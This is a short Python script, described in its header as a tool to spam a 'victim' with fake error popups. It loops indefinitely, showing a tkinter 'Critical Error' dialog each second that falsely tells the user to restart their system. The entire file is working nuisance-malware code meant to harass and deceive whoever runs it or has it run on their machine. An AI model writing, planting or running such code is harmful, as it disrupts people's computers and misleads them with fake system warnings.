# popup_spam_tkinter.py
# Spams the victim with fake error message popups (cross-platform).

import tkinter as tk
from tkinter import messagebox
import time

def spam_popups():
    """
    Spams the screen with error message popups using tkinter.
    """
    try:
        while True:
            root = tk.Tk()
            root.withdraw()  # Hide the empty tkinter window
            messagebox.showerror("Critical Error", "An error has occurred. Please restart your system.")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Popup spam terminated.")

if __name__ == "__main__":
    spam_popups()
